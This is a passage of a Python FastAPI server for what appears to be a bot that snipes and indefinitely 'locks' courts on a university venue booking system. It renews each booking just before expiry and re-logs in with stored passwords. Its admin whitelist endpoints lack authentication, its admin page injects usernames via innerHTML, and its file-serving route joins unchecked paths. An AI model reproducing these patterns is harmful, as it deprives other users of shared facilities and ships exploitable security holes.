                
                wait_time = min(RENEW_START_DELAY - elapsed, 10)
                if stop_event.wait(timeout=wait_time):
                    add_log(f"⏹️ [Task {task_id}] 检测到停止信号", username=account_name)
                    return
                continue

            # === 阶段3：9分50秒后开始续订（到期前10秒） ===
            
            # 🔒 续订前检查 Cookie 有效期
            # 策略: <3分钟先刷新, 3-14分钟续订后刷新, >14分钟正常续订
            cookie_exp = get_cookie_exp_time(current_cookies)
            cookie_about_to_expire = False
            need_refresh_after_renew = False  # 标记是否需要续订后刷新
            
            if cookie_exp:
                time_until_cookie_exp = cookie_exp - time.time()
                if time_until_cookie_exp < 180:  # 距过期不足3分钟，必须先刷新
                    cookie_about_to_expire = True
                    add_log(f"⚠️ [Task {task_id}] Cookie 有效期不足（{int(time_until_cookie_exp)}秒 < 3分钟），先刷新再续订...", username=account_name)
                elif time_until_cookie_exp <= 840:  # 3-14分钟，标记续订后刷新
                    need_refresh_after_renew = True
                    add_log(f"📋 [Task {task_id}] Cookie 有效期 {int(time_until_cookie_exp)}秒（3-14分钟），续订后刷新", username=account_name)
            
            # 即使无法解析过期时间，也检查距上次刷新是否超过55分钟
            if not cookie_exp and (time.time() - last_credential_refresh) > 55 * 60:
                cookie_about_to_expire = True
                add_log(f"⚠️ [Task {task_id}] 距上次刷新已超过55分钟，保守刷新凭证...", username=account_name)
            
            if cookie_about_to_expire:
                pwd = None
                with SESSION_LOCK:
                    if account_name in USER_SESSIONS:
                        pwd = USER_SESSIONS[account_name].get('password')
                if pwd:
                    try:
                        status, res = deduplicated_login(account_name, pwd)
                        if status == "success":
                            current_token = res['token']
                            current_cookies = res['cookies']
                            current_user_agent = res.get('user_agent')
                            last_credential_refresh = time.time()
                            current_credential_timestamp = time.time()  # 🔑 更新凭证时间戳
                            add_log(f"✅ [Task {task_id}] 续订前凭证刷新成功！", username=account_name)
                        elif status == "need_2fa":
                            add_log(f"⚠️ [Task {task_id}] 刷新需要 2FA，使用现有凭证尝试续订", username=account_name)
                        else:
                            add_log(f"⚠️ [Task {task_id}] 续订前刷新失败: {res}，使用现有凭证尝试", username=account_name)
                    except Exception as pre_refresh_err:
                        add_log(f"⚠️ [Task {task_id}] 续订前刷新异常: {pre_refresh_err}", username=account_name)
            
            add_log(f"⚡ [Task {task_id}] 开始续订 (距上次成功 {int(elapsed)}秒)", username=account_name)
            with TASK_LOCK:
                if task_id in TASK_MANAGER:
                    TASK_MANAGER[task_id]['status'] = "续订中"
            
            renew_start = time.time()
            round_success = False
            
            # 续订窗口 60 秒
            while time.time() - renew_start < RENEW_WINDOW:
                if stop_event.is_set(): 
                    return
                
                # 同步最新凭证 - 只在确实有更新时才同步
                with SESSION_LOCK:
                    if account_name in USER_SESSIONS:
                        cached = USER_SESSIONS[account_name]
                        cached_updated = cached.get('last_updated', 0)
                        if cached_updated > current_credential_timestamp:
                            current_token = cached['token']
                            current_cookies = cached.get('cookies', {})
                            current_user_agent = cached.get('user_agent')
                            current_credential_timestamp = cached_updated
                            add_log(f"🔄 [Task {task_id}] 同步到新凭证", username=account_name)
                
                # 发送续订请求（使用登录时的UA）
                ok_renew, msg_renew, _ = send_booking_request(
                    current_token, user_id, date, start_time, end_time,
                    venue_id, price, cookies=current_cookies, user_agent=current_user_agent
                )
                
                if ok_renew:
                    renew_count += 1
                    # 🔑 关键：更新成功时间点
                    last_success_time = time.time()
                    add_log(f"✅ [Task {task_id}] 第 {renew_count} 次续订成功! 新基准: {datetime.datetime.now().strftime('%H:%M:%S')}", username=account_name)
                    
                    # 🔑 续订后刷新: 如果之前标记了需要刷新（Cookie 有效期 3-14 分钟）
                    if need_refresh_after_renew:
                        add_log(f"🔄 [Task {task_id}] 续订成功，开始刷新 Cookie...", username=account_name)
                        pwd = None
                        with SESSION_LOCK:
                            if account_name in USER_SESSIONS:
                                pwd = USER_SESSIONS[account_name].get('password')
                        if pwd:
                            try:
                                status, res = deduplicated_login(account_name, pwd)
                                if status == "success":
                                    current_token = res['token']
                                    current_cookies = res['cookies']
                                    current_user_agent = res.get('user_agent')
                                    last_credential_refresh = time.time()
                                    current_credential_timestamp = time.time()
                                    add_log(f"✅ [Task {task_id}] 续订后 Cookie 刷新成功！", username=account_name)
                                else:
                                    add_log(f"⚠️ [Task {task_id}] 续订后刷新失败: {res}", username=account_name)
                            except Exception as post_refresh_err:
                                add_log(f"⚠️ [Task {task_id}] 续订后刷新异常: {post_refresh_err}", username=account_name)
                    
                    round_success = True
                    break
                
                time.sleep(0.3)
            
            if not round_success and not stop_event.is_set():
                # === 失败后立即尝试刷新凭证并重试 ===
                add_log(f"⚠️ [Task {task_id}] 续订失败，尝试刷新凭证后重试...", username=account_name)
                pwd = None
                with SESSION_LOCK:
                    if account_name in USER_SESSIONS:
                        pwd = USER_SESSIONS[account_name].get('password')
                
                rescue_success = False
                if pwd:
                    try:
                        status, res = deduplicated_login(account_name, pwd)
                        if status == "success":
                            current_token = res['token']
                            current_cookies = res['cookies']
                            current_user_agent = res.get('user_agent')
                            last_credential_refresh = time.time()
                            current_credential_timestamp = time.time()  # 🔑 更新凭证时间戳
                            add_log(f"✅ [Task {task_id}] 凭证刷新成功，立即重试续订...", username=account_name)
                            
                            # 立即重试续订（3次机会）
                            for retry in range(3):
                                ok_retry, msg_retry, _ = send_booking_request(
                                    current_token, user_id, date, start_time, end_time,
                                    venue_id, price, cookies=current_cookies, user_agent=current_user_agent
                                )
                                if ok_retry:
                                    renew_count += 1
                                    last_success_time = time.time()
                                    add_log(f"✅ [Task {task_id}] 救援续订成功！（第 {retry + 1} 次尝试）", username=account_name)
                                    rescue_success = True
                                    break
                                time.sleep(0.5)
                    except Exception as rescue_err:
                        add_log(f"⚠️ [Task {task_id}] 救援异常: {rescue_err}", username=account_name)
                
                if not rescue_success:
                    add_log(f"❌ [Task {task_id}] 本轮续订失败，场地可能已丢失。", username=account_name)
                    # 发送失败邮件通知
                    if email:
                        send_lock_failed_email(email, account_name, venue_name, f"第 {renew_count + 1} 次续订失败，刷新凭证后仍无法成功")
                    with TASK_LOCK:
                        if task_id in TASK_MANAGER:
                            TASK_MANAGER[task_id]['status'] = "续订失败"
                    stop_event.set()
                    break
                else:
                    round_success = True  # 救援成功，标记为成功
            
            # 续订成功，更新状态
            with TASK_LOCK:
                if task_id in TASK_MANAGER:
                    TASK_MANAGER[task_id]['status'] = f"已锁场: {venue_name}"
    
    finally:
        add_log(f"⏹️ [Task {task_id}] 锁场任务已停止", username=account_name)
        with TASK_LOCK:
            if task_id in TASK_MANAGER:
                del TASK_MANAGER[task_id]
        # 同时从 Redis 删除，避免服务重启后重新加载
        remove_task_from_redis(task_id)



def snipe_worker(task_id, stop_event, token, user_id, date, start_time, end_time, 
                price, username, target_venue_id=None, email=None):
    """
    自动捡漏/扫场 Worker
    1. 轮询场地状态
    2. 发现可用场地立即预定
    3. 预定成功后，自动切换到锁场模式 (lock_worker)
    """
    add_log(f"🔭 [Task {task_id}] 捡漏任务启动: {date} {start_time}", username=username)
    
    current_token = token
    current_cookies = {}
    current_user_agent = None
    
    # 初始获取 Cookies 和 UA
    with SESSION_LOCK:
        if username in USER_SESSIONS:
            current_cookies = USER_SESSIONS[username].get('cookies', {})
            current_user_agent = USER_SESSIONS[username].get('user_agent')

    with TASK_LOCK:
        if task_id in TASK_MANAGER:
            TASK_MANAGER[task_id]['status'] = "正在扫描场地..."
    
    retry_count = 0
    

    # 限制最大重试次数或无限制? 通常捡漏是持续的
    while not stop_event.is_set():
        # 0. 检查时间是否已过 (自动停止)
        try:
            target_dt = datetime.datetime.strptime(f"{date} {start_time}", "%Y-%m-%d %H:%M")
            if datetime.datetime.now() > target_dt:
                add_log(f"⏰ [Task {task_id}] 已到达场地开始时间 ({date} {start_time})，任务自动结束", username=username)
                stop_event.set()
                break
        except: pass

        if stop_event.wait(timeout=1.5): # 1.5s 轮询间隔
            return

        # 1. 获取最新凭证 (自动救援支持)
        with SESSION_LOCK:
            if username in USER_SESSIONS:
                cached = USER_SESSIONS[username]
                if cached.get('token') and cached.get('token') != current_token:
                    current_token = cached['token']
                    current_cookies = cached.get('cookies', {})
                    current_user_agent = cached.get('user_agent')
                    # add_log(f"🔄 [Task {task_id}] 同步新凭证", username=username)

        # 2. 查询场地
        try:
            # 传递 username 以启用 fetch_venue_data 内部的自动救援
            raw_list = fetch_venue_data(current_token, date, current_cookies, username=username)
        except Exception as e:
            add_log(f"⚠️ [Task {task_id}] 查询异常: {e}", username=username)
            time.sleep(5)
            continue
            
        if not raw_list:
            continue
            
        # 3. 筛选可用场地
        available_venue = None
        for v in raw_list:
            # 必须匹配开始时间
            if v.get('startTime') != start_time: continue
            
            # 如果指定了场地ID，必须匹配
            if target_venue_id and str(v.get('venueId')) != str(target_venue_id): continue
            
            # 检查状态: availNum=1 表示空闲
            if v.get('availNum') == 1 and not v.get('fixedPurpose'):
                available_venue = v
                break
        
        if available_venue:
            v_name = available_venue.get('venueName')
            v_id = available_venue.get('venueId')
            v_price = available_venue.get('price', price)
            
            add_log(f"🎯 [Task {task_id}] 发现可用场地: {v_name} ({v_id})", username=username)
            
            # 4. 尝试预定（使用登录时的UA）
            ok, msg, _ = send_booking_request(
                current_token, user_id, date, start_time, end_time,
                v_id, v_price, cookies=current_cookies, user_agent=current_user_agent
            )
            
            if ok:
                add_log(f"✅ [Task {task_id}] 捡漏成功！({v_name})", username=username)
                
                # 发送通知
                from core import send_email_notification
                email = None
                with SESSION_LOCK:
                    email = USER_SESSIONS.get(username, {}).get('email')
                if email:
                    order_details = f"任务ID: {task_id}\n捡漏成功: {v_name}\n日期: {date} {start_time}"
                    send_email_notification(email, username, order_details)

                # 5. 切换到锁场模式
                add_log(f"🔐 [Task {task_id}] 自动切换为锁场保活模式...", username=username)
                
                # 更新任务状态
                with TASK_LOCK:
                    if task_id in TASK_MANAGER:
                        TASK_MANAGER[task_id]['type'] = 'lock'
                        TASK_MANAGER[task_id]['status'] = f"已捡漏: {v_name}"
                        TASK_MANAGER[task_id]['info'] = f"[{username}] {date} {start_time} {v_name}"

                # 启动锁场线程 (复用 lock_worker)
                lock_worker(
                    task_id, stop_event, current_token, user_id, date, start_time, end_time,
                    v_id, v_price, username, v_name, email
                )
                return 
                
            else:
                add_log(f"❌ [Task {task_id}] 预定失败: {msg}", username=username)
        else:
            pass

        retry_count += 1
    
    # 退出时清理
    add_log(f"⏹️ [Task {task_id}] 捡漏任务已停止", username=username)
    with TASK_LOCK:
        if task_id in TASK_MANAGER:
            del TASK_MANAGER[task_id]
    # 同时从 Redis 删除，避免服务重启后重新加载
    remove_task_from_redis(task_id)


@app.post("/api/task/monitor")
async def start_monitor(request: Request):
    """
    启动监控任务（使用 threading，与 server.py 完全一致）
    1. 如果 venueId 存在 + lockMode: 先预定，成功后启动 lock_worker 线程
    2. 如果没有 venueId: 启动扫描线程（自动捡漏）
    """
    data = await request.json()
    tid = str(uuid.uuid4())[:8].upper()
    
    token = data.get('token')
    date = data.get('date')
    start_time = data.get('startTime')
    end_time = data.get('endTime')
    venue_id = data.get('venueId')
    is_lock_mode = bool(data.get('lockMode')) 
    venue_name = data.get('venueName', f"场地{venue_id}")
    username = data.get('username')
    price = data.get('price', 40)
    email = data.get('email')
    
    # 从 token 获取 userId
    u_info = extract_user_info(token)
    user_id = u_info.get('userId') if u_info else None
    if not username:
        username = u_info.get('account') if u_info else None
    
    mode_str = "无限锁场" if (venue_id and is_lock_mode) else "自动捡漏"
    add_log(f"👀 [Task {tid}] 开始: {date} {start_time} {venue_name if venue_id else '自动可以场地'} ({mode_str})", username=username)
    
    # 情况1: 前端指定了具体场地 + 无限锁场
    if venue_id and is_lock_mode:
        # 获取 cookies 和 UA
        cookies = {}
        user_agent = None
        with SESSION_LOCK:
            if username in USER_SESSIONS:
                cookies = USER_SESSIONS[username].get('cookies', {})
                user_agent = USER_SESSIONS[username].get('user_agent')
        
        # 先执行单次预定（使用登录时的UA）
        ok, msg, _ = send_booking_request(
            token, user_id, date, start_time, end_time, venue_id, price,
            cookies=cookies, user_agent=user_agent
        )
        
        if ok:
            add_log(f"✅ [Task {tid}] 预定成功！启动锁场保活...", username=username)
            
            # 发送邮件通知
            from core import send_email_notification
            if email:
                order_details = f"任务ID: {tid}\n场地: {venue_name}\n日期: {date} {start_time}-{end_time}\n(首单预定成功，已启动锁场)"
                send_email_notification(email, username, order_details)
            
            # 创建停止事件和任务记录
            stop_event = threading.Event()
            with TASK_LOCK:
                task_data = {
                    "type": "lock",
                    "status": "已锁场",
                    "stop_event": stop_event,
                    "username": username,
                    "info": f"[{username}] {date} {start_time} {venue_name}",
                    "params": data # Save params for potential restore
                }
                TASK_MANAGER[tid] = task_data
                save_task_to_redis(tid, task_data)
            
            # 启动 lock_worker 线程
            t = threading.Thread(target=lock_worker, args=(
                tid, stop_event, token, user_id, date, start_time, end_time,
                venue_id, price, username, venue_name, email
            ))
            t.daemon = True
            t.start()
            
            return {"status": "success", "task_id": tid, "msg": "预定成功，锁场已启动"}
        else:
            add_log(f"❌ [Task {tid}] 预定失败: {msg}", username=username)
            return {"status": "error", "msg": f"预定失败: {msg}"}
    
    # 情况2: 自动捡漏模式 / 指定场地捡漏
    # 启动捡漏线程
    stop_event = threading.Event()
    with TASK_LOCK:
        task_data = {
            "type": "snipe",
            "status": "初始化...",
            "stop_event": stop_event,
            "username": username,
            "info": f"[{username}] {date} {start_time} (捡漏)",
            "params": data
        }
        TASK_MANAGER[tid] = task_data
        save_task_to_redis(tid, task_data)
    
    t = threading.Thread(target=snipe_worker, args=(
        tid, stop_event, token, user_id, date, start_time, end_time,
        price, username, venue_id, email
    ))
    t.daemon = True
    t.start()
    
    return {"status": "success",  "task_id": tid, "msg": "自动捡漏任务已启动"}


@app.post("/api/task/stop")
async def stop_task(request: Request):
    """停止任务"""
    data = await request.json()
    task_id = data.get('taskId')
    
    with TASK_LOCK:
        if task_id in TASK_MANAGER:
            task_info = TASK_MANAGER[task_id].get('info', '')
            task_username = TASK_MANAGER[task_id].get('username')
            
            TASK_MANAGER[task_id]['stop_event'].set()
            TASK_MANAGER[task_id]['status'] = "Stopped"
            
            # 从 Redis 删除任务（而不是保存更新），因为任务已停止
            remove_task_from_redis(task_id)
            
            # 使用用户要求的格式: 👀 [Task ID] : Info ---已停止
            add_log(f"👀 [Task {task_id}] : {task_info} ---已停止", username=task_username)
            
            # 为了让前端立即感知，我们可以稍微延迟一点点删除吗？
            # 不，前端会乐观更新。后端这里只需要负责日志和信号。
            return {"status": "success", "msg": "停止信号已发送"}
    
    return {"status": "error", "msg": "任务不存在"}


@app.get("/api/logs")
async def get_logs(username: str = None):
    """获取日志（按用户过滤）"""
    try:
        if username:
            # 返回该用户的日志
            log_key = f"scut_order:logs:{username}"
        else:
            # 返回全局日志
            log_key = "scut_order:logs:global"
        
        logs = redis_client.lrange(log_key, 0, 99)
        return logs[::-1]  # 倒序返回
    except Exception as e:
        # Fallback to memory logs
        try:
            from core import MEMORY_LOGS, MEMORY_LOG_LOCK
            with MEMORY_LOG_LOCK:
                return MEMORY_LOGS[:100]
        except:
            return [f"日志加载失败 (Redis & Memory): {e}"]


@app.get("/api/tasks")
async def list_tasks(username: str = None):
    """获取任务列表（按用户过滤）"""
    with TASK_LOCK:
        result = {}
        for tid, info in TASK_MANAGER.items():
            # 如果指定了 username，只返回该用户的任务
            if username:
                if info.get("username") != username:
                    continue
            result[tid] = {
                "type": info.get("type"),
                "status": info.get("status"),
                "info": info.get("info")
            }
        return result

# ============== 月场预定 API ==============

@app.post("/api/monthly/create")
async def create_monthly_task(request: Request):
    """创建月场预定任务"""
    try:
        data = await request.json()
        token = data.get('token')
        username = data.get('username')
        email = data.get('email')
        target_year = int(data.get('target_year'))
        target_month = int(data.get('target_month'))
        weekday = int(data.get('weekday'))  # 1-7
        start_time = data.get('start_time')
        end_time = data.get('end_time')
        venue_ids = data.get('venue_ids', [])  # 场地ID列表
        
        # 验证必填参数
        if not all([token, username, target_year, target_month, weekday, start_time, end_time, venue_ids]):
            return {"status": "error", "msg": "缺少必填参数"}
        
        # 从 token 中提取 user_id
        user_info = extract_user_info(token)
        if not user_info:
            return {"status": "error", "msg": "无效的 token"}
        
        user_id = user_info['userId']
        
        # 创建任务
        task_id = create_monthly_booking_task(
            username, token, user_id, email,
            target_year, target_month, weekday,
            start_time, end_time, venue_ids
        )
        
        add_log(f"📅 [月场预定] {username} 创建任务: {target_year}年{target_month}月 周{weekday} {start_time}-{end_time}", username=username)
        
        return {
            "status": "success",
            "task_id": task_id,
            "msg": "月场预定任务已创建"
        }
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "error", "msg": str(e)}

@app.get("/api/monthly/tasks")
async def list_monthly_tasks(username: str = None):
    """获取月场任务列表"""
    try:
        tasks = get_monthly_tasks(username)
        return {"status": "success", "tasks": tasks}
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.post("/api/monthly/cancel")
async def cancel_monthly_booking_task(request: Request):
    """取消月场任务"""
    try:
        data = await request.json()
        task_id = data.get('task_id')
        username = data.get('username')
        
        if not task_id or not username:
            return {"status": "error", "msg": "缺少必填参数"}
        
        success = cancel_monthly_task(task_id, username)
        
        if success:
            add_log(f"🚫 [月场预定] {username} 取消任务 {task_id}", username=username)
            return {"status": "success", "msg": "任务已取消"}
        else:
            return {"status": "error", "msg": "取消失败（任务不存在或已执行）"}
            
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.get("/api/monthly/venue_ids")
async def get_monthly_venue_ids():
    """获取月场可用场地ID映射"""
    return {"status": "success", "venue_ids": VENUE_ID_MAP}

# ============================================


@app.post("/api/admin/whitelist/add")
async def add_whitelist(request: Request):
    """在线添加白名单"""
    try:
        data = await request.json()
        username = data.get('username')
        note = data.get('note', '')  # 备注
        
        if not username:
             return {"status": "error", "msg": "Username required"}
             
        path = "allowed_users.txt"
        mode = "a" if os.path.exists(path) else "w"
        
        # 简单的文件去重检查
        current_users = set()
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    u = line.split('#')[0].strip()
                    if u: current_users.add(u)
        
        if str(username) in current_users:
            return {"status": "success", "msg": f"用户 {username} 已在白名单中"}
            
        with open(path, mode, encoding="utf-8") as f:
            prefix = "\n" if mode == "a" and os.path.getsize(path) > 0 else ""
            line_content = f"{prefix}{username}"
            if note:
                line_content += f" # {note}"
            f.write(line_content)
            
        add_log(f"👮 [Admin] 已添加白名单用户: {username}")
        return {"status": "success", "msg": f"已添加 {username}"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.post("/api/admin/whitelist/remove")
async def remove_whitelist(request: Request):
    """在线移除白名单用户"""
    try:
        data = await request.json()
        username = data.get('username')
        if not username: return {"status": "error", "msg": "Username required"}
        
        path = "allowed_users.txt"
        if not os.path.exists(path):
            return {"status": "error", "msg": "Whitelist file not found"}
            
        lines = []
        removed = False
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                if line.split('#')[0].strip() == str(username):
                    removed = True
                else:
                    lines.append(line)
        
        if removed:
            with open(path, "w", encoding="utf-8") as f:
                f.writelines(lines)
            add_log(f"👮 [Admin] 已移除白名单用户: {username}")
            return {"status": "success", "msg": f"已移除 {username}"}
        else:
            return {"status": "error", "msg": "User not found"}
            
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.get("/api/admin/whitelist")
async def get_whitelist():
    """获取白名单列表"""
    path = "allowed_users.txt"
    users = []
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split('#')
                        users.append({
                            "username": parts[0].strip(),
                            "note": parts[1].strip() if len(parts) > 1 else ""
                        })
        except: pass
    return {"status": "success", "data": users}

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    """
    白名单管理后台 (Direct Link)
    """
    html = """
    <!doctype html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>SCUT 白名单管理</title>
        <style>body{font-family: sans-serif; padding: 20px;} textarea{width:100%; height:300px; margin-top:10px;}</style>
    </head>
    <body onload="loadList()">
        <h2>🔐 SCUT 白名单管理后台</h2>
        <form onsubmit="addUser(); return false;">
            <input type="text" id="u" placeholder="输入学号/账号" required style="padding:5px;">
            <input type="text" id="n" placeholder="备注 (可选)" style="padding:5px;">
            <button type="submit" style="padding:5px 10px; cursor:pointer;">添加用户</button>
            <button type="button" onclick="loadList()" style="padding:5px 10px; cursor:pointer;">刷新列表</button>
        </form>
        <hr/>
        <h3>管理列表 <small style="font-size:12px;color:gray">(点击移除)</small></h3>
        <div id="list-container" style="max-width:500px">
            Loading...
        </div>
        
        <script>
            async function loadList() {
                try {
                    const res = await fetch('/api/admin/whitelist');
                    const j = await res.json();
                    if(j.status === 'success') {
                        const div = document.getElementById('list-container');
                        div.innerHTML = '';
                        const ul = document.createElement('ul');
                        j.data.forEach(user => {
                            const li = document.createElement('li');
                            li.style.marginBottom = '5px';
                            li.innerHTML = `
                                <b>${user.username}</b> 
                                <span style='color:gray'>${user.note ? '('+user.note+')' : ''}</span>
                                <a href='#' onclick='removeUser("${user.username}");return false' style='color:red;margin-left:10px'>[删除]</a>
                            `;
                            ul.appendChild(li);
                        });
                        div.appendChild(ul);
                    }
                } catch(e) { console.error(e); }
            }

            async function addUser() {
                const u = document.getElementById('u').value;
                const n = document.getElementById('n').value;
                if(!u) return;
                
                try {
                    const res = await fetch('/api/admin/whitelist/add', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({username: u, note: n})
                    });
                    const j = await res.json();
                    if(j.status === 'success') {
                        alert('添加成功！');
                        document.getElementById('u').value = '';
                        document.getElementById('n').value = '';
                        loadList();
                    } else {
                        alert('失败: ' + j.msg);
                    }
                } catch(e) { alert(e); }
            }

            async function removeUser(username) {
                if(!confirm('确定要删除 ' + username + ' 吗？')) return;
                try {
                    const res = await fetch('/api/admin/whitelist/remove', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({username: username})
                    });
                    const j = await res.json();
                    if(j.status === 'success') {
                        loadList();
                    } else {
                        alert('删除失败: ' + j.msg);
                    }
                } catch(e) { alert(e); }
            }
        </script>
    </body>
    </html>
    """
    return html

@app.get("/{full_path:path}")
async def serve_all(full_path: str):
    file_path = os.path.join(DIST_DIR, full_path)
    if os.path.exists(file_path) and os.path.isfile(file_path): 
        return FileResponse(file_path)
    if os.path.exists(INDEX_PATH): 
        return FileResponse(INDEX_PATH)
    return HTMLResponse("Not Found", status_code=404)

if __name__ == "__main__":
    # 启动时加载 Session 缓存
    load_sessions_from_file()
    
    # 启动时清理所有日志和残留进程
    try:
        # 清理全局日志
        redis_client.delete("scut_order:logs:global")
        # 清理所有用户日志
        for key in redis_client.keys("scut_order:logs:*"):
            redis_client.delete(key)
    except: pass
    
    kill_zombie_processes()
    uvicorn.run(app, host="0.0.0.0", port=5003, access_log=False)
